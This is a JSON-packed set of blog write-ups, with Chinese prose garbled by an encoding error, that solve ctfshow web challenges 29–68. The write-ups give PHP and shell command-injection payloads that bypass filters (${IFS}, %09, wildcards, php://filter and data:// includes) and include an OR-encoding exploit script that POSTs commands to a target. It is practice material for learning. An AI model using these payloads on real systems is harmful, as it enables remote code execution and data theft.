·ã€‚\npayload:\n~~~\nc=show_source(\"flag.php\");\n~~~\n# web 61~65\nè¿™äº›é¢˜éƒ½ä¸€æ ·ã€‚\npayloadï¼š\n~~~\nc=show_source(\"flag.php\");\n~~~\n# web66\n![](/pic/66.png)\nè¿™ä¸€é“é¢˜`show_source`ä¸èƒ½ç”¨äº†ã€‚\n![](/pic/66.1.png)\nè€Œä¸”flagè¿˜ä¸åœ¨flag.phpä¸­ã€‚\n![](/pic/66.2.png)\nå…ˆç”¨\n~~~\nvar_dump(scandir('/'));\n~~~\næŸ¥çœ‹ç›®å½•ç»“æ„ï¼Œå‘ç°æ˜¯flag.txt\npayload:\n~~~\nc=highlight_flie(\"/flag.txt\");\n~~~\n# web67\nè¿™ä¸€é¢˜å’Œä¸Šä¸€é¢˜ä¸€æ ·ã€‚\n~~~\nc=highlight_file(\"/flag.txt\");\n~~~\n# web68\n![](/pic/68.png)\nè¿™ä¸€é“é¢˜æˆ‘éƒ½æ‡µäº†ï¼Œæ€ä¹ˆä¸ç»™æºç å•Šã€‚\nçœ‹åˆ«äººçš„wpè¯´çš„æ¢æˆæ–‡ä»¶åŒ…å«å°±å¯ä»¥ã€‚ã€‚ã€‚ã€‚\npayload:\n~~~\nc=include(\"/flag.txt\");\n~~~","tags":["ctfshow","åˆ·é¢˜","web"],"categories":["web","ctfshow","åˆ·é¢˜"]},{"title":"ctfshow webå…¥é—¨53~56","url":"/2023/01/20/ctfshow-webå…¥é—¨52~56/","content":"# web53\n![](/pic/53.png)\nå¤šè¿‡æ»¤äº†ä¸€ä¸ªwgetï¼Œå¤šæ·»åŠ äº†ä¸€ä¸ªå›æ˜¾ã€‚\npayload:\n~~~\n?c=ca''t${IFS}fla''g.php\n~~~\n<!--more-->\n# web54\n![](/pic/54.png)\nè¿™é“å°†ä½¿ç”¨`''`çš„æ–¹å¼ç»™å‰”é™¤äº†ã€‚å»ç½‘ä¸Šæ‰¾å…¶ä»–äººçš„wpå‘ç°å¥½å‡ ç§æ–¹æ³•ã€‚\nç¬¬ä¸€ç§ï¼š\nå¯ä»¥ç”¨mvã€‚\npayload:\n~~~\n/?c=mv${IFS}fla?.php${IFS}abc.txt\n/abc.txt\n~~~\nç¬¬äºŒç§ï¼š\n~~~\ngrep test *file   #åœ¨å½“å‰ç›®å½•ä¸­ï¼ŒæŸ¥æ‰¾åç¼€æœ‰ file å­—æ ·çš„æ–‡ä»¶ä¸­åŒ…å« test å­—ç¬¦ä¸²çš„æ–‡ä»¶ï¼Œå¹¶æ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²çš„è¡Œ\n~~~\npayloadï¼š\n~~~\n?c=grep${IFS}ctf${IFS}fl???php\n~~~\nç¬¬ä¸‰ç§ï¼š\nå¯ä»¥ç”¨`rev`é€†åºè¾“å‡º\npayload:\n~~~\n?c=rev${IFS}fl??????\n~~~\nç¬¬å››ç§ï¼š\nç”¨`paste`ç›´æ¥æŸ¥çœ‹\npayload:\n~~~\n?c=paste${IFS}fl??????\n~~~\nç¬¬äº”ç§ï¼š\nå¯ä»¥ç†è§£ä¸ºå½“å‰ç›®å½•è¿è¡Œcatå‘½ä»¤å®é™…ä¸Šè¿è¡Œçš„ä¹Ÿæ˜¯bin/catã€‚\npayloadï¼š\n~~~\n/bin/?at${IFS}fl??????\n~~~\n# web55\n![img](/pic/55.png)\né¢˜æ˜¯çœŸçš„æ¶å¿ƒï¼Œè„‘å­æœ‰ç‚¹ç—’ï¼Œæ„Ÿè§‰è¦é•¿è„‘å­äº†ã€‚ã€‚ã€‚ã€‚\n[ç»§æ— å­—æ¯æ•°å­—çš„å‘½ä»¤æ‰§è¡Œ(ctfshow webå…¥é—¨ 55)æ–°å§¿åŠ¿](https://blog.csdn.net/qq_46091464/article/details/108555433)\npayload:\n~~~\n?c=/???/????64 ????.???\n~~~\n# web56\n![img](/pic/56.png)\né¢˜æ˜¯è¶Šæ¥è¶Šéš¾äº†ã€‚\nå‚è€ƒPç¥çš„æ–‡ç« [ä¸Šæ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)\né¦–å…ˆæ„é€ ä¸€ä¸ªPOSTä¸Šä¼ æ–‡ä»¶çš„æ•°æ®åŒ…\n~~~\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>POSTæ–‡ä»¶ä¸Šä¼ </title>\n</head>\n<body>\n<form action=\"http://17d01aae-51d9-48fe-abfb-d9ba10037d72.chall.ctf.show/\" method=\"post\" enctype=\"multipart/form-data\">\n    <!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥-->\n    <label for=\"file\">æ–‡ä»¶åï¼š</label>\n    <input type=\"file\" name=\"file\" id=\"file\"><br>\n    <input type=\"submit\" name=\"submit\" value=\"æäº¤\">\n</form>\n</body>\n</html>\n~~~\nä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶\n~~~\n#!/bin/sh\nls\n~~~\næ³¨ï¼šshellç¨‹åºå¿…é¡»ä»¥\"#!/bin/sh\"å¼€å§‹ï¼Œ#! /bin/sh æ˜¯æŒ‡æ­¤è„šæœ¬ä½¿ç”¨/bin/shæ¥è§£é‡Šæ‰§è¡Œï¼Œ#!æ˜¯ç‰¹æ®Šçš„è¡¨ç¤ºç¬¦ï¼Œå…¶åé¢è·Ÿçš„æ˜¯è§£é‡Šæ­¤è„šæœ¬çš„shellçš„è·¯å¾„\nç”¨bpæŠ“åŒ…\næŠ“åŒ…ä¹‹åæ·»åŠ å‚æ•°cå¦‚ä¸‹ï¼Œå¤šå‘åŒ…å‡ æ¬¡ï¼ˆå› ä¸ºå¹¶ä¸ä¸€å®šç”Ÿæˆçš„ä¸´æ—¶æ–‡ä»¶çš„æœ€åä¸€ä¸ªå­—æ¯å°±æ˜¯å¤§å†™å­—æ¯ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°æ‰§è¡Œäº†lså‘½ä»¤\n![img](/pic/56.1)\nå‚æ•°å†…å®¹ä¸ºä»€ä¹ˆæ˜¯ .%20/???/????????[@-[] ,Pç¥çš„æ–‡ç« å·²ç»å†™çš„å¾ˆè¯¦ç»†äº†ã€‚\næœ€åç”¨catçœ‹ä¸€ä¸‹å°±å¯ä»¥äº†\n![](/pic/56.2)","tags":["ctfshow","åˆ·é¢˜","web"],"categories":["web","ctfshow","åˆ·é¢˜"]},{"title":"ctfshow åˆ·é¢˜web45~52","url":"/2023/01/17/ctfshow-åˆ·é¢˜web45~52/","content":"# web45\n![img](/pic/45.png)\nè¿‡æ»¤äº†ç©ºæ ¼ï¼Œç”¨`%09`ç»•è¿‡ï¼Œ&&ç­‰äº;ï¼Œä¹Ÿå¯ä»¥ç”¨`||`å’Œ`%0a`ã€‚\npayload:\n~~~\n/?c=tac%09fl*||\n/?c=sort%09fl*||\n/?c=echo%09`tac%09fla*`||\n~~~\n<!--more-->\n# web46\n![img](/pic/46.png)\nå¤šè¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼Œä½†è¿˜æ˜¯å¯ä»¥%`09`è¿‡æ»¤ç©ºæ ¼ï¼Œå› ä¸º`%09`è§£ç åå°±ä¸æ˜¯æ•°å­—äº†ï¼Œæ˜¯ä¸€ä¸ªæ°´å¹³åˆ¶è¡¨ç¬¦ã€‚\n`*`è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨`?`\npayload:\n~~~\n/?c=tac%09fla?.php||\n/?c=nl<fla''g.php|| nlæŸ¥çœ‹æºä»£ç ï¼Œ<ä»£æ›¿ç©ºæ ¼ï¼Œ''åˆ†å‰²flagè¿‡æ»¤ï¼Œ||è§£å†³å‘½ä»¤é»‘æ´\n~~~\n# web47\n![](/pic/47.png)\næ— éå°±æ˜¯sortæ— æ³•ç”¨äº†ï¼Œä¸Šä¸€é¢˜çš„payloadè¿˜å¯ä»¥ç”¨ã€‚\n# web48\n![](/pic/48.png)\nä¸Šä¸€é¢˜çš„payloadä¾ç„¶å¯ä»¥ç”¨ã€‚\n# web49\n![](/pic/49.png)\nä¾ç„¶å¯ä»¥ç”¨ã€‚\n# web50\n![](/pic/50.png)\n`%09`è¿‡æ»¤äº†ï¼Œ`<>`å’Œ`?`ä¸€èµ·ä½¿ç”¨æ—¶æ²¡æœ‰å›æ˜¾,æ‰€ä»¥è¿™é‡Œçš„`?`å¯ä»¥ç”¨`\\`å’Œ`''`è¿›è¡Œä»£æ›¿,ã€‚\npaylaod:\n~~~\n/?c=tac<fla\\g.php||\n/?c=nl<fla''g.php||\n~~~\n# web51\n![](/pic/51.png)\ntacè¢«è¿‡æ»¤äº†ï¼Œåªèƒ½ç”¨nlã€‚\npayload:\n~~~\n?c=nl<fla\\g.php||\n~~~\n# web52\n![](/pic/52.png)\n<>ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œè¿˜å¯ä»¥ç”¨`$IFS`\npayload:\n~~~\n/?c=nl${IFS}fla\\g.php||\n~~~","tags":["ctfshow","åˆ·é¢˜","web"],"categories":["web","ctfshow","åˆ·é¢˜"]},{"title":"ctfshow webå…¥é—¨41~44","url":"/2023/01/14/ctfshow41-44/","content":"# web41\n![img](/pic/web41.png)\nè¿™ä¸ªé¢˜è¿‡æ»¤äº†$ã€+ã€-ã€^ã€~ä½¿å¾—å¼‚æˆ–è‡ªå¢å’Œå–åæ„é€ å­—ç¬¦éƒ½æ— æ³•ä½¿ç”¨ï¼ŒåŒæ—¶è¿‡æ»¤äº†å­—æ¯å’Œæ•°å­—ã€‚ä½†æ˜¯ç‰¹æ„ç•™äº†ä¸ªæˆ–è¿ç®—ç¬¦|ã€‚\næˆ‘ä»¬å¯ä»¥å°è¯•ä»asciiä¸º0-255çš„å­—ç¬¦ä¸­ï¼Œæ‰¾åˆ°æˆ–è¿ç®—èƒ½å¾—åˆ°æˆ‘ä»¬å¯ç”¨çš„å­—ç¬¦çš„å­—ç¬¦ã€‚\n<!--more-->\nå€Ÿç”¨å¸ˆå‚…ä»¬çš„è„šæœ¬ï¼šhttps://blog.csdn.net/miuzzx/article/details/108569080\n~~~\n<?php\n$myfile = fopen(\"rce_or.txt\", \"w\");\n$contents=\"\";\nfor ($i=0; $i < 256; $i++) { \n\tfor ($j=0; $j <256 ; $j++) { \n\n\t\tif($i<16){\n\t\t\t$hex_i='0'.dechex($i);\n\t\t}\n\t\telse{\n\t\t\t$hex_i=dechex($i);\n\t\t}\n\t\tif($j<16){\n\t\t\t$hex_j='0'.dechex($j);\n\t\t}\n\t\telse{\n\t\t\t$hex_j=dechex($j);\n\t\t}\n\t\t$preg = '/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-/i';\n\t\tif(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){\n\t\t\t\t\techo \"\";\n    }\n  \n\t\telse{\n\t\t$a='%'.$hex_i;\n\t\t$b='%'.$hex_j;\n\t\t$c=(urldecode($a)|urldecode($b));\n\t\tif (ord($c)>=32&ord($c)<=126) {\n\t\t\t$contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\";\n\t\t}\n\t}\n\n}\n}\nfwrite($myfile,$contents);\nfclose($myfile);\n~~~\n~~~\n# -*- coding: utf-8 -*-\nimport requests\nimport urllib\nfrom sys import *\nimport os\nos.system(\"php rce_or.php\")  #æ²¡æœ‰å°†phpå†™å…¥ç¯å¢ƒå˜é‡éœ€æ‰‹åŠ¨è¿è¡Œ\nif(len(argv)!=2):\n   print(\"=\"*50)\n   print('USERï¼špython exp.py <url>')\n   print(\"egï¼š  python exp.py http://ctf.show/\")\n   print(\"=\"*50)\n   exit(0)\nurl=argv[1]\ndef action(arg):\n   s1=\"\"\n   s2=\"\"\n   for i in arg:\n       f=open(\"rce_or.txt\",\"r\")\n       while True:\n           t=f.readline()\n           if t==\"\":\n               break\n           if t[0]==i:\n               #print(i)\n               s1+=t[2:5]\n               s2+=t[6:9]\n               break\n       f.close()\n   output=\"(\\\"\"+s1+\"\\\"|\\\"\"+s2+\"\\\")\"\n   return(output)\n   \nwhile True:\n   param=action(input(\"\\n[+] your functionï¼š\") )+action(input(\"[+] your commandï¼š\"))\n   data={\n       'c':urllib.parse.unquote(param)\n       }\n   r=requests.post(url,data=data)\n   print(\"\\n[*] result:\\n\"+r.text)\n~~~\n![img](/pic/web41.1.png)\nå¾—åˆ°flag\n# web42\n![img](/pic/web42.png)\n~~~\n1ï¼š> ä»£è¡¨é‡å®šå‘åˆ°å“ªé‡Œï¼Œä¾‹å¦‚ï¼šecho â€œ123â€ > /home/123.txt\n2ï¼š/dev/null ä»£è¡¨ç©ºè®¾å¤‡æ–‡ä»¶\n3ï¼š2> è¡¨ç¤ºstderræ ‡å‡†é”™è¯¯\n4ï¼š& è¡¨ç¤ºç­‰åŒäºçš„æ„æ€ï¼Œ2>&1ï¼Œè¡¨ç¤º2çš„è¾“å‡ºé‡å®šå‘ç­‰åŒäº1\n5ï¼š1 è¡¨ç¤ºstdoutæ ‡å‡†è¾“å‡ºï¼Œç³»ç»Ÿé»˜è®¤å€¼æ˜¯1ï¼Œæ‰€ä»¥\">/dev/null\"ç­‰åŒäº â€œ1>/dev/nullâ€\n~~~\nå‚è€ƒï¼šhttps://www.cnblogs.com/kexianting/p/11630085.html\nç”¨åŒå†™ç»•è¿‡\npayload:\n~~~\n?c=cat flag.php;ls\n~~~\n# web43\n![img](/pic/web43.png)\nå°†;è¿‡æ»¤æ‰äº†ï¼Œå¯ä»¥ä½¿ç”¨å…¶ä»–çš„å‘½ä»¤åˆ†éš”ç¬¦ï¼›\nå¸¸è§çš„å‘½ä»¤åˆ†éš”ç¬¦ï¼š\n~~~\n1ã€â€œ;â€åˆ†éš”ç¬¦\nç”¨åˆ†å·åˆ†éš”çš„å‘½ä»¤ä¼šæŒ‰é¡ºåºæ‰§è¡Œï¼Œå³ä½¿ä¸­é—´å‘½ä»¤ä½¿ç”¨æ–¹å¼ä¸å¯¹ï¼Œä¼šæœ‰ç›¸å…³é”™è¯¯è¾“å‡ºï¼Œåé¢çš„å‘½ä»¤ç…§æ ·ä¼šæ‰§è¡Œã€‚å¦‚ï¼š\nè¾“å…¥ï¼šå‘½ä»¤Aï¼›å‘½ä»¤Bï¼›å‘½ä»¤C\næŒ‰é¡ºåºæ‰§è¡ŒAã€Bã€Cå‘½ä»¤ï¼Œè‹¥Bå‘½ä»¤è°ƒç”¨æ–¹å¼ä¸å¯¹ï¼Œç»ˆç«¯ä¼šæœ‰ç›¸å…³é”™è¯¯æç¤ºï¼Œæç¤ºåä¼šç»§ç»­æ‰§è¡ŒCå‘½ä»¤ã€‚\n2ã€â€œ&&â€åˆ†éš”ç¬¦\nåŒCã€C++è¯­è¨€é€»è¾‘è¿ç®—ç¬¦\"&&\"ç±»ä¼¼ï¼Œé‡åˆ°é¦–ä¸ªå‘½ä»¤æ‰§è¡Œå¤±è´¥åï¼Œåé¢çš„å‘½ä»¤ä¸ä¼šæ‰§è¡Œã€‚å¦‚ï¼š\nè¾“å…¥ï¼šå‘½ä»¤A && å‘½ä»¤B && å‘½ä»¤C\nå…ˆæ‰§è¡Œå‘½ä»¤Aï¼Œè‹¥Aå‘½ä»¤æ‰§è¡Œæ­£ç¡®åˆ™å†æ‰§è¡Œå‘½ä»¤Bã€‚å‡å¦‚å‘½ä»¤Bæ‰§è¡Œå¤±è´¥ï¼Œåˆ™åœæ­¢ï¼ŒCå‘½ä»¤ä¸ä¼šè¢«æ‰§è¡Œåˆ°ã€‚\n3ã€â€œ||â€åˆ†éš”ç¬¦\nåŒCã€C++è¯­è¨€é€»è¾‘è¿ç®—ç¬¦\"||\"ç±»ä¼¼ï¼Œé‡åˆ°é¦–ä¸ªå‘½ä»¤æ‰§è¡ŒæˆåŠŸåï¼Œåé¢çš„å‘½ä»¤ä¸ä¼šæ‰§è¡Œã€‚å¦‚ï¼š\nè¾“å…¥ï¼šå‘½ä»¤A || å‘½ä»¤B || å‘½ä»¤C\nå…ˆæ‰§è¡Œå‘½ä»¤Aï¼Œè‹¥Aå‘½ä»¤æ‰§è¡Œå¤±è´¥åˆ™å†æ‰§è¡Œå‘½ä»¤Bã€‚å‡å¦‚å‘½ä»¤Bæ‰§è¡ŒæˆåŠŸï¼Œåˆ™åœæ­¢ï¼ŒCå‘½ä»¤ä¸ä¼šè¢«æ‰§è¡Œåˆ°ã€‚\n~~~\npayloadï¼š\n~~~\n?c=tac flag.php||ls\n~~~\n# web44\n![img](/pic/web44.png)\nflagä¹Ÿè¿‡æ»¤äº†ï¼Œå°±ç”¨é€šé…ç¬¦å‘—ã€‚\npayload:\n~~~\n/?c=tac fl*||ls\n~~~\nå¸¸è§çš„é€šé…ç¬¦æœ‰`*`ã€`?`ã€‚","tags":["ctfshow","åˆ·é¢˜","web"],"categories":["web","ctfshow","åˆ·é¢˜"]},{"title":"chtshow webå…¥é—¨37~40","url":"/2023/01/11/chtshow37-40/","content":"# web 37\n![img](/pic/web37.png)\nè€ƒå¯Ÿdataä¼ªåè®®ï¼Œdataä¼ªåè®®éœ€æ»¡è¶³allow_url_fopenï¼Œallow_url_includeåŒæ—¶å¼€å¯æ‰èƒ½ä½¿ç”¨ã€‚\npayloadï¼š\n~~~\n/?c=data://text/plain,<?php system(\"cat fl*\");?>\n~~~\n# web38\n![img](/pic/web38.png)\nphpè¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨çŸ­æ ‡ç­¾ç»•è¿‡phpã€‚\nçŸ­æ ‡ç­¾ï¼šæ¯”<?php ?>æ›´çµæ´»è°ƒç”¨çš„æ–¹æ³•  <? /*ç¨‹åºæ“ä½œ*/ ?>  <?=/*å‡½æ•°*/?>\npaylaodï¼š\n~~~\n?c=data://text/plain,<?=`cat fla*`;?>\n/?c=data://text/plain,<?=system(\"cat fl*\");?>\n~~~\n<!--more-->\n# web39\nincludeä¸­å¤šäº†ä¸ª.phpï¼Œä½†æ˜¯ä¸Šä¸€é¢˜çš„payloadä¹Ÿç®¡ç”¨ï¼Œçœ‹åˆ«äººçš„wpè¯´æ˜¯æœ‰?>ç»“å°¾è¿›è¡Œé—­åˆï¼Œæ‰€ä»¥æ²¡æœ‰å½±å“ã€‚\npayload:\n~~~\n/?c=data://text/plain,<?php system(\"cat fla*\")?>\n~~~\n# web40\n![img](/pic/web40.png)\nè¿™ä¸ªè¿‡æ»¤äº†ä¸å°‘ä¸œè¥¿ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤è‹±æ–‡å­—æ¯ã€ä¸‹åˆ’çº¿å’Œè‹±æ–‡çš„æ‹¬å·ã€‚\nå¯ä»¥ç”¨æç¤ºçš„æ–¹æ³•\n~~~\nshow_source(next(array_reverse(scandir(pos(localeconv())))));\nshow_source()å‡½æ•°å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤º\nnext() å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º\narray_reverse() å‡½æ•°ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„\nscandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„\npos() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼\nlocaleconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„\n~~~\nä¹Ÿå¯ä»¥æ¢å…¶ä»–æ–¹æ³•\né¦–å…ˆ\n~~~\n/?c=print_r(get_defined_vars());\n~~~\nè·å¾—ä¸€ä¸‹ä¿¡æ¯\n![img](/pic/web40.1.png)\nä½¿ç”¨nextè·å–è¿™ä¸ªæ•°ç»„çš„ä¸‹ä¸€ä¸ªä½ç½®çš„å…ƒç´ ï¼Œä¹Ÿå°±æ˜¯POSTçš„å…ƒç´ .\n~~~\n/?c=print_r(next(get_defined_vars()));\n~~~\n![img](/pic/web40.2.png)\nç„¶åæŠŠè¿™ä¸ªå…ƒç´ å¼¹å‡ºï¼Œç”¨array_pop\n~~~\n/?c=print_r(array_pop(next(get_defined_vars())));\n~~~\n![img](/pic/web40.3.png)\næœ€åå†ç”¨evalæ‰§è¡Œä¸€ä¸‹å°±å¯ä»¥äº†\n~~~\n/?c=eval(array_pop(next(get_defined_vars())));\n~~~\nPOSTæ•°æ®\n~~~\n1=system(\"cat flag.php\");æˆ–1=echo`cat flag.php`;\n~~~\nå…³äºechoã€printã€print_rçš„åŒºåˆ«å¯ä»¥å‚è€ƒï¼šhttps://blog.51cto.com/zlong37/1556855\n# å¸¸ç”¨çš„æ³¨é‡Šç¬¦\n```\n#ã€--ã€-- -ã€//ã€/**/ã€/*letmetest*/ã€;%00\n```\n# MySQLä¸­å¯ä»¥ä»£æ›¿ç©ºæ ¼çš„å­—ç¬¦\n```\n/**/ã€()ã€=ã€%20ã€%09ã€%0aã€0x0aã€0x0bã€0x0cã€0x0dã€+ã€-ã€~ã€.ç­‰ç­‰\n```","tags":["ctfshow","åˆ·é¢˜","web"],"categories":["web","ctfshow","åˆ·é¢˜"]},{"title":"ctfshow webå…¥é—¨29~36","url":"/2023/01/09/ctfshow29-36/","content":"# web29\n![img](/pic/web29.png)\nè¿‡æ»¤äº†flagï¼Œå¯ä»¥ç”¨system,echoç­‰.\n~~~\n/?c=system(\"cat fla*\");\n/?c=echo`cat fl*`;\n~~~\n# web30\n![img](/pic/web30.png)\nå¤šè¿‡æ»¤äº†ä¸€ä¸ªsystemï¼Œè¿˜å¯ä»¥ç”¨echo.\n~~~\n/?echo`cat fl*`;\n~~~\n<!--more-->\n# web31\n![img](/pic/web31.png)\ncatå’Œç©ºæ ¼è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨tac.\nç©ºæ ¼å¯ä»¥ç”¨%09ç»•è¿‡.\n~~~\n/?c=echo%09`tac%09fl*`;\n~~~\n# web32\n![img](/pic/web32.png)\nè¿‡æ»¤çš„ä¸œè¥¿å¤ªå¤šäº†å·¦æ‹¬å·éƒ½ç»™è¿‡æ»¤äº†ï¼Œä½¿ç”¨å‘½ä»¤é€ƒé€¸+æ–‡ä»¶åŒ…å«.\nç©ºæ ¼å¯ä»¥ç”¨%09ç»•è¿‡ï¼Œ ï¼›å¯ä»¥ç”¨?>ç»•è¿‡,å› ä¸ºä½¿ç”¨?>ï¼Œæ‰€ä»¥åé¢æ²¡åŠæ³•ç›´æ¥æ‹¼æ¥phpè¯­å¥ï¼Œéœ€è¦ä½¿ç”¨æ–‡ä»¶åŒ…å«.\n~~~\n/?c=include%09$_GET[1]?>&&1=php://filter/convert.base64-encode/resource=flag.php\n~~~\nå†å°†å¾—åˆ°çš„è¿›è¡Œbase64è§£ç å¾—åˆ°flag\n# web33\n![img](/pic/web33.png)\nå’Œweb32å·®ä¸å¤šï¼Œç”¨åŒæ ·çš„payloadå°±è¡Œ\n~~~\n/?c=include%09$_GET[1]?>&&1=php://filter/convert.base64-encode/resource=flag.php\n~~~\n# web34\nä¾æ—§å¯ä»¥ç”¨åŒæ ·çš„payload\n~~~\n/?c=include%09$_GET[1]?>&&1=php://filter/convert.base64-encode/resource=flag.php\n~~~\n# web35\nä¾æ—§å¯ä»¥ç”¨åŒæ ·çš„payload\n~~~\n/?c=include%09$_GET[1]?>&&1=php://filter/convert.base64-encode/resource=flag.php\n~~~\nè¿ç»­å‡ é“é¢˜éƒ½ä¸€æ ·ï¼Œå†™çš„çœŸæ¶å¿ƒ.\n# web36\nè¿™é“é¢˜æŠŠ1æ¢æˆå…¶ä»–çš„å­—ç¬¦å°±è¡Œï¼Œå…¶ä»–æ­¥éª¤ä¸€æ ·.\n~~~\n/?c=include%09$_GET[a]?>&&a=php://filter/convert.base64-encode/resource=flag.php\n~~~\n\nrequireå¯ä»¥ä»£æ›¿includeï¼ŒPHPå¸¸ç”¨çš„å¯ä»¥ä¸åŠ æ‹¬å·çš„å‡½æ•°echoã€printã€issetã€unsetã€includeã€require.","tags":["ctfshow","åˆ·é¢˜","web"],"categories":["web","ctfshow","åˆ·é¢˜"]}]